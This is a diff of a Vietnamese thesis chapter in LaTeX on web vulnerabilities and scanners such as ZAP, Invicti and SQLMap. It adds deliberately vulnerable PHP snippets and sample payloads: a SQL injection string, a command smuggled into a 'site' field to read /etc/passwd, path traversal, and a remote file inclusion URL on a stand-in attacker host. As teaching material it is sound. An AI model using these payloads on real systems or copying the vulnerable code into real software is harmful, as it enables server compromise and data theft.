@@ -2,6 +2,115 @@
 \documentclass[./../main.tex]{subfiles}
 
 \begin{document}
+Hiện nay, có rất nhiều kĩ thuật tấn công vào ứng dụng Web bao gồm cả phía
+máy chủ và phía máy khách. Dưới đây mà một số lỗ hổng được trình bày trong
+phạm vi được khai thác trong khóa luận.
+
+\subsection{SQL Injection}
+
+Với các ứng dụng Web hiện nay, việc lưu trữ dữ liệu thường được lưu tại
+cơ sở dữ liệu. Các cơ sở dữ liệu đến ngày nay vẫn là một cơ sở dữ liệu
+phổ biến do sự tin cậy và tốc độ của chúng. Để truy vấn được đến các dữ
+liệu này, các máy chủ Web cần sử dụng các truy vấn SQL để lấy dữ liệu đến
+người dùng. Tuy nhiên, sự không kiểm soát các đầu vào của người dùng có
+thể khiển các câu lệnh truy vấn SQL có thể bị thay đổi để thực thi các câu
+lệnh bất thường làm lộ thông tin Cơ sở dữ liệu hoặc tệ hơn nữa làm cho cơ
+sở dữ liệu mất quyền kiểm soát.
+
+Ví dụ với ngôn ngữ PHP dưới đây
+\begin{lstlisting}[language=php, caption=SQL Injection]
+    // The article parameter is assigned to $article
+    // variable without any sanitization or validation
+    $articleid = $_GET['article'];
+    // The $articleid parameter is passed as part of
+    // the query
+    $query = "SELECT * FROM articles WHERE articleid = $articleid";
+\end{lstlisting}
+Khi người dùng tùy chỉnh tham số `article' thành các câu lệnh dạng như
+`1 or 1=1-- -' sẽ khiến vô tình dữ liệu của toàn bộ bảng `article' được
+đưa ra ngoài.
+
+Không chỉ tại câu lệnh truy vấn đó, các câu lệnh có thể sử dụng để lấy toàn
+bộ cơ sở dữ liệu thậm chí là đặt cửa hậu để tấn công về sau.
+
+Hiện nay các kĩ thuật tấn công rất đang dạng như boolean-based blind,
+time-based blind, error-based, UNION query-based, stacked queries and
+Out-of-band.
+
+\subsection{OS Command Injection}
+OS Commnad Injection là lỗ hổng cho phép thực thi các câu lệnh
+của hệ điều hành trái phép. Nguyên do cũng đến từ việc cho phép người dùng
+nhập trực tiếp hoặc xử lý không hết hoàn toàn các câu lệnh thực thi trên
+máy chủ Web. Các lỗ hổng này thường dẫn đến thực thi lệnh trái phép trên
+máy chủ Web.
+Ví dụ với ngôn ngữ PHP dưới đây về một chương trình giúp phân giải tên miền
+thông qua câu lệnh `host' của Linux
+
+\begin{lstlisting}[language=php, caption=OS Command Injection]
+    echo shell_exec("host {$_POST["site"]}");
+\end{lstlisting}
+
+Với các tham số của `site' như `google.com; cat /etc/pasword' sẽ khiển chương trình thực thi câu lệnh `host google.com; cat /etc/passwd' ở hệ điều hành làm lộ thông tin máy chủ.
+
+\subsection{Remote Code Evaluation}
+Remote Code Evaluation là lỗ hổng cho phép thực thi các đoạn mã trái phép trên trình phân tích cú pháp của ngôn ngữ - thường xảy ra với các ngôn ngữ thông dịch. Các đầu vào khi không được kiểm soát hoàn toàn có thể khiển các đoạn mã được thực thi trái phép. Các lỗ hổng dạng này cũng thường dẫn đến thực thi lệnh trái phép trên máy chủ Web.
+
+Một ví dụ về việc thực thi `eval()' trong PHP dẫn đến lỗ hổng
+
+\begin{lstlisting}[language=php, caption=Remote Code Evaluation]
+    eval ("echo ".$_REQUEST["parameter"].";");
+\end{lstlisting}
+
+Với tham số `parameter' là `1;phpinfo();' khiến câu truy vấn này đưa ra thông tin máy chủ Web của thông tin PHP do hàm `phpinfo()' được thực thi.
+
+\subsection{Server Side Template Injection}
+Tương tự với Remote Code Evaluation, Server Side Template Injection cũng cho phép thực thi các đoạn mã trên trình phân tích của Template Engine. Template Engine là các phần thực hiện việc phân tích cú pháp, thực thi các đoạn mã để sinh ra được nhiều đầu ra khác nhau thông qua một bản mẫu chỉ cần thay đổi tham số đầu vào. Lỗ hổng này cũng thường dẫn đến việc thực
+thi lệnh trái phép trên máy chủ Web.
+
+Ví dụ đoạn mã sau
+
+\begin{lstlisting}[language=php, caption=Server Side Template Injection]
+    $output = $twig->render($_GET['custom_email'],  array("first_name" => $user.first_name) );
+\end{lstlisting}
+
+Ba lỗ hổng OS Command Injection, Remote Code Evaluation và Server Side Template Injection có vector khai thác và mức độ tác động tương tự nhau nên trong một số trường hợp được gọi chung với cái tên Code Injection.
+
+\subsection{Local File Inclusion và Directory Traversal}
+Local File Inclusion là lỗ hổng làm cho máy chủ làm lộ hoặc thực thi các
+nội dung tập tin trên máy chủ đó. Trong các trường hợp như PHP, khi được
+phép tải lên tùy ý tập tin lên thì lỗ hổng này có thể dẫn đến thực thi lệnh
+trái phép trên máy chủ Web.
+
+Ví dụ như đoạn mã sau:
+
+\begin{lstlisting}[language=php, caption=Local File Inclusion]
+    $file = $_GET['file'];
+    include($file);
+\end{lstlisting}
+
+Với ví dụ trên, khi người dùng được phép tải lên tập tin tùy ý sẽ khiến cho có thể thực thi bất kì đoạn mã nào do PHP cho phép xử lý động các đoạn mã
+khi được gọi câu lệnh `include'. Ví dụ như tham số `file' là `/var/www/upload/evil.php' Với `evil.php' là tập tin có chứ các đoạn mã thực thi lệnh
+trái phép.
+
+Kể cả khi không được tải lên tùy ý, lỗ hổng Local File Inclusion cũng
+thường được kết hợp với Directory Traversal, cho phép tùy ý đọc tập tin
+tại vị trí không được phép để làm lộ các thông tin nhạy cảm của hệ thống.
+
+Ví dụ với tham số được chèn `../../etc/passwd' sẽ khiến thông tin về tập
+tin `/etc/passwd' được trả về cho người dùng.
+
+\subsection{Remote File Inclusion}
+
+Tương tự như Local File Inclusion, Remote File Inclusion cho phép máy chủ
+làm lộ hoặc thực thi các tập tin nhưng với nội dung từ xa. Thường thì các
+dẫn đến thực thi lệnh trái phép trên máy chủ Web.
+
+Tiếp tục với ví dụ của lỗ hổng Local File Inclusion, khi tùy chọn `php allow_url_fopen' được bật sẽ cho phép PHP tải về các nội dung trong URL. Nếu
+kẻ tấn công đưa vào tham số `file' là `http://attacker.example.com/evil.php'
+thì kẻ tấn công có thể thực thi lệnh trên máy chủ PHP.
+
+\section{Các công cụ rà quét lỗ hổng}
+
 \subsection{Zed Attack Proxy (ZAP)}
 OWASP Zed Attack Proxy (thường được gọi là  ZAP hay ZAProxy) là công cụ mã nguồn mở,
 công cụ cho phép các các kỹ sư an toàn thông tin tìm kiếm được lỗ hổng một cách tự
@@ -36,7 +145,7 @@ Ngoài ra, một số Addon sẽ được phát triển như một phần của 
 là các phần mở rộng thông thường và cũng được các Addon khác sử dụng như
 một phần của ZAP Core.
 
-\subsection{ZAP Addons}
+\subsubsection{ZAP Addons}
 Điểm đặc biệt của ZAP là cơ chế mở rộng bằng ZAP Addons cho phép cộng đồng
 xây dựng được các phần mở rộng riêng cho mình trên ZAP mà không cần sửa
 các phần liên quan đến ZAP Core, đảm bảo sự độc lập tránh sự mâu thuẫn giữa
@@ -44,13 +153,13 @@ các ZAP Addon hoặc ZAP Addon với chính ZAP, đồng thời cũng đảm b�
 phần được bảo trị độc lập liên tục.
 
 \subsubsection{Addon Spider và Addon Spider Ajax}
-Spider là một trong các Addons chính, được phát triển để Crawl và phát
+Spider là một trong các Addons chính, được phát triển để thu thập và phát
 hiện được các thành phần đơn trong Website như các URL, hành động,...được gọi là các
 Site Node. Site Node cung cấp sẽ thông tin cho người dùng về thông tin
 Website đồng thời cũng cung cấp các thông tin về Website cho các Addon
 khác thông qua các API của ZAP.
 
-Spider sẽ crawl dựa trên cây DOM của Website, do đó Spider này sẽ chỉ nhận
+Spider sẽ thu thập dựa trên cây DOM của Website, do đó Spider này sẽ chỉ nhận
 được các thông tin từ web tĩnh. Để lấy được các thông tin trong việc chạy
 JavaScript thì cần có một Addon khác là Ajax Spider. Ajax spider sử dụng
 Selenium như một trình web để duyệt web ảo và thực hiện thu thập các thông
@@ -72,85 +181,36 @@ không mong muốn đối với Website mục tiêu.
 Các luật liên tục được cộng đồng duy trì và phát triển theo các lỗ hổng
 đã xuất hiện và hiện hành.
 
-\subsection{Lỗ hổng ứng dụng Web}
+\subsection{Invicti}
 
-Hiện nay, có rất nhiều kĩ thuật tấn công vào ứng dụng Web bao gồm cả phía
-máy chủ và phía máy khách. Dưới đây mà một số lỗ hổng được trình bày trong
-phạm vi được khai thác trong khóa luận.
+Invicti hay trước đây là NetSparker là một công cụ rà quét lỗ hổng tự động
+được xây dựng bằng cách cung cấp các bằng chứng về việc khác thác lỗ hổng luôn
+trong quá trình rà quét. Điều này khiến cho các lỗ hổng thu thập được trong
+quá trình rà quét có độ tin cậy cao hơn rất nhiều so với các công cụ
+rà quét tự động khác. Ngoài ra, các thành phần khác
+như tổ chức quét tự động, thiết lập cầu hình quét, sinh báo cáo và cung cấp
+công cụ khai thác/hậu khai cũng giúp cho Invicti là một công cụ được sử dụng
+nhiều trong các doanh nghiệp.
 
-\subsubsection{SQL Injection}
+\subsection{Các công cụ khác}
 
-Với các ứng dụng Web hiện nay, việc lưu trữ dữ liệu thường được lưu tại
-cơ sở dữ liệu. Các cơ sở dữ liệu đến ngày nay vẫn là một cơ sở dữ liệu
-phổ biến do sự tin cậy và tốc độ của chúng. Để truy vấn được đến các dữ
-liệu này, các máy chủ Web cần sử dụng các truy vấn SQL để lấy dữ liệu đến
-người dùng. Tuy nhiên, sự không kiểm soát các đầu vào của người dùng có
-thể khiển các câu lệnh truy vấn SQL có thể bị thay đổi để thực thi các câu
-lệnh bất thường làm lộ thông tin Cơ sở dữ liệu hoặc tệ hơn nữa làm cho cơ
-sở dữ liệu mất quyền kiểm soát.
+Trên thị trường, hiện nay còn có rất nhiều công cụ được sử dụng trong việc
+rà quét lỗ hổng như Acunetix và BurpSuite.
 
-Ví dụ với ngôn ngữ PHP dưới đây
-\begin{lstlisting}[language=php, caption=SQL Injection]
-    // The article parameter is assigned to $article
-    // variable without any sanitization or validation
-    $articleid = $_GET['article'];
-    // The $articleid parameter is passed as part of
-    // the query
-    $query = "SELECT * FROM articles WHERE
-    articleid = $articleid";
-\end{lstlisting}
-Khi người dùng tùy chỉnh tham số `article` thành các câu lệnh dạng như
-`1 or 1=1-- -` sẽ khiến vô tình dữ liệu của toàn bộ bảng `article` được
-đưa ra ngoài.
+Acunetix là cũng là một công cụ rà quét tự động được sử dụng phổ biến trong
+doanh nghiệp. Điểm nổi trội của Acunetix là sử dụng công nghệ AcuSensor cho
+phép kiểm thử bằng cách thực thi ngay tại máy chủ Web mã phía máy chủ để cung
+cấp thêm thông tin cho trình phân tích. Công nghệ này được giới thiệu rằng có
+thể đưa ra các lỗ hổng có tính xác thực đến gần 100\% các lỗ hổng như SQL Injection,
+Code Injeciton, File Inclusion\ldots
 
-Không chỉ tại câu lệnh truy vấn đó, các câu lệnh có thể sử dụng để lấy toàn
-bộ cơ sở dữ liệu thậm chí là đặt cửa hậu để tấn công về sau.
+BurpSuite là một trình quét sử dụng dựa trên cơ chế "middle-in-the-middle-proxy"
+tương tự ZAP nhưng sử dụng nhiều các thành phần được phát triển bởi
+các nhà nghiên cứu của BurpSuite với kì vọng đem lại tất cả các tính năng
+thông qua chúng. BurpSuite thường được sử dụng với các nhà nghiên cứu và săn
+tiền thưởng.
 
-Hiện nay các kĩ thuật tấn công rất đang dạng như boolean-based blind,
-time-based blind, error-based, UNION query-based, stacked queries and
-Out-of-band.
-
-\subsubsection{OS Command Injection}
-OS Commnad Injection là lỗ hổng cho phép thực thi các câu lệnh
-của hệ điều hành trái phép. Nguyên do cũng đến từ việc cho phép người dùng
-nhập trực tiếp hoặc xử lý không hết hoàn toàn các câu lệnh thực thi trên
-máy chủ Web. Các lỗ hổng này thường dẫn đến thực thi lệnh trái phép trên
-máy chủ Web.
-
-\subsubsection{Remote Code Evaluation}
-Remote Code Evaluation là lỗ hổng cho phép thực thi các đoạn mã trái phép trên trình
-phân tích cú pháp của ngôn ngữ - thường xảy ra với các ngôn ngữ thông dịch.
-Các đầu vào khi không được kiểm soát hoàn toàn có thể khiển các đoạn mã
-được thực thi trái phép. Các lỗ hổng dạng này cũng thường dẫn đến thực thi
-lệnh trái phép trên máy chủ Web.
-
-\subsubsection{Server Side Template Injection}
-Tương tự với Remote Code Evaluation, Server Side Template Injection cũng
-cho phép thực thi các đoạn mã trên trình phân tích của Template Engine.
-Template Engine là các phần thực hiện việc phân tích cú pháp, thực thi
-các đoạn mã để sinh ra được nhiều đầu ra khác nhau thông qua một bản mẫu
-chỉ cần thay đổi tham số đầu vào. Lỗ hổng này cũng thường dẫn đến việc thực
-thi lệnh trái phép trên máy chủ Web.
-
-Ba lỗ hổng OS Command Injection, Remote Code Evaluation và Server Side Template Injection
-có vector khai thác và mức độ tác động tương tự nhau nên trong một số trường hợp
-được gọi chung với cái tên Code Injection.
-
-\subsubsection{Local File Inclusion và Directory Traversal}
-Local File Inclusion là lỗ hổng làm cho máy chủ làm lộ hoặc thực thi các
-nội dung tập tin trên máy chủ đó. Trong các trường hợp như PHP, khi được
-phép tải lên tùy ý tập tin lên thì lỗ hổng này có thể dẫn đến thực thi lệnh
-trái phép trên máy chủ Web.
-
-Kể cả khi không được tải lên tùy ý, lỗ hổng Local File Inclusion cũng
-thường được kết hợp với Directory Traversal, cho phép tùy ý đọc tập tin
-tại vị trí không được phép để làm lộ các thông tin nhạy cảm của hệ thống.
-
-\subsubsection{Remote File Inclusion}
-
-Tương tự như Local File Inclusion, Remote File Inclusion cho phép máy chủ
-làm lộ hoặc thực thi các tập tin nhưng với nội dung từ xa. Thường thì các
-dẫn đến thực thi lệnh trái phép trên máy chủ Web.
+\section{Các công cụ khai thác lỗ hổng}
 
 \subsection{Công cụ SQL Map}
 SQLMap là Một công cụ mã nguồn mở được sử dụng để tự động quá trình xác
@@ -199,5 +259,6 @@ hổng kể cả các lỗ hổng phức tạp thành qua mẫu rà quét.
 Số lượng mẫu rà quét được các nhà nghiên cứu bảo mật và cộng đồng cập nhật liên tục
 khiến đây là công cụ rất hiệu quả để phát hiện các lỗ hổng trong các sản phẩm,
 thư viện phổ biến hiện nay (tính đến tháng 05/2020 khoảng 3200 mẫu).
+
 
 \end{document}
